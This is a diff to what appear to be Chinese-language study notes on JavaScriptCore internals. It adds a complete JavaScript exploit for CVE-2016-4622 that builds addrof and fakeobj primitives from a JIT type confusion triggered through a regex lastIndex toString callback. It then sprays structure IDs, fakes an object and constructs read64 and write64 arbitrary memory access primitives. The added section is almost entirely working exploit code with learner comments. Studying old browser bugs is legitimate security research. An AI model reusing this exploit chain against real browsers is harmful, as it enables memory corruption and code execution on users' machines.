@@ -1006,6 +1006,8 @@ int main(int argc, char **argv)
 
 
 
+
+
 ### CVE-2016-4622 + JavascriptCore 內部機制
 
 #### env / background
@@ -1647,6 +1649,158 @@ Ref to LiveOverflow
   3. arbitrary r/w
   4. (memory clean)
   5. do stuff ...
+
+
+
+最終的 exploit (到 arbitrary r/w)：
+
+```js
+function addrof(val) {
+    var array = [13.37]; // create array
+    var reg = /abc/y; // create regular expression
+
+    // y for sticky:
+    // The sticky property reflects whether or not the search is sticky,
+    // (searches in strings only from the index indicated by the lastIndex property
+    // of this regular expression). sticky is a read-only property of
+    // an individual regular expression object
+    
+    // Target function
+    var AddrGetter = function(array) {
+        "abc".match(reg); // original: reg[Symbol.match]();
+        return array[0];
+        /* when it's jited, it will return double value (because of array[0]),
+         * but jit doesn't check if array[0] is still a double
+         */
+    }
+    
+    // Force optimization
+    // JIT it !
+    for (var i = 0; i < 10000; ++i)
+        AddrGetter(array);
+    
+    // Setup haxx
+    // Update array[0] to our target object when regex do lastIndex()
+    regexLastIndex = {};
+    regexLastIndex.toString = function() {
+        array[0] = val; // set the first element to an object
+        return "0";
+    };
+    reg.lastIndex = regexLastIndex;
+    
+    // Do it!
+    // return first element of array
+    return AddrGetter(array);
+    // lastIndex is an object ??! We need to get number from call lastIndex.toString() !
+    // Oh! I get "0" and the lastIndex must be 0 --> trigger exp
+}
+
+
+function fakeobj(dbl) {
+    var array = [13.37];
+    var reg = /abc/y;
+
+    var AddrSetter = function(array) {
+        "abc".match(reg);
+        array[0] = dbl; // type confusion
+    }
+    
+    for (var i = 0; i < 10000; ++i)
+        AddrSetter(array);
+    
+    regexLastIndex = {};
+    regexLastIndex.toString = function() {
+        array[0] = {};
+        return "0";
+    };
+    reg.lastIndex = regexLastIndex;
+
+    AddrSetter(array);
+    return array[0]
+}
+
+for (var i = 0; i < 0x1000; i++) {
+    spray = {}
+    spray.x = 1
+    spray['prop_' + i] = 2
+}
+
+buf = new ArrayBuffer(8);
+u32 = new Uint32Array(buf);
+f64 = new Float64Array(buf);
+
+// spray for structureID
+// the type of structure_spray is ArrayWithContiguous
+var structure_spray = [];
+for (var i = 0; i < 1000; i++) {
+    var array = [13.37];
+    array.a = 13.37;
+    array['prop' + i] = 13.37;
+    structure_spray.push(array)
+}
+
+/* ---------------- stage 1 ---------------- */
+// the type of victim is ArrayWithDouble
+var victim = structure_spray[510];
+
+u32[0] = 0x200; // for structureID
+u32[1] = 0x01082007 - 0x10000 // why sub 0x10000?
+var flags_double = f64[0]
+u32[1] = 0x01082009 - 0x10000
+var flags_cont = f64[0]
+
+// NonArray (inline array)
+var outer = {
+    cell_header: flags_cont,
+    butterfly: victim,
+}
+
+f64[0] = addrof(outer)
+u32[0] += 0x10
+var hax = fakeobj(f64[0])
+
+/* ---------------- stage 2 ---------------- */
+var unboxed_size = 10
+// CopyOnWriteArrayWithDouble
+var unboxed = eval(`[${'13.37,'.repeat(unboxed_size)}]`)
+unboxed[0] = 13.337 // not we need ArrayWithDouble
+
+var boxed = [{}] // JSCValue
+
+hax[1] = unboxed // change victim butterfly to unboxed metadata
+var tmp_butterfly = victim[1] // get unboxed butterfly
+
+hax[1] = boxed // change victim butterfly to unboxed metadata
+// set boxed butterfly to tmp_butterfly, which is shared with unboxed
+victim[1] = tmp_butterfly
+
+// the idea is same as original reg bug
+
+stage2_addrof = function (obj) {
+    boxed[0] = obj;
+    return unboxed[0];
+}
+
+stage2_fakeobj = function (addr) {
+    unboxed[0] = addr;
+    return boxed[0];
+}
+
+outer.cell_header = flags_double
+read64 = function(where) {
+    f64[0] = where;
+    u32[0] += 0x10; // .a offset is -0x10
+    hax[1] = f64[0];
+    return victim.a;
+}
+
+write64 = function(where, what) {
+    f64[0] = where;
+    u32[0] += 0x10; // .a offset is -0x10
+    hax[1] = f64[0];
+    victim.a = what;
+}
+```
 
 
 
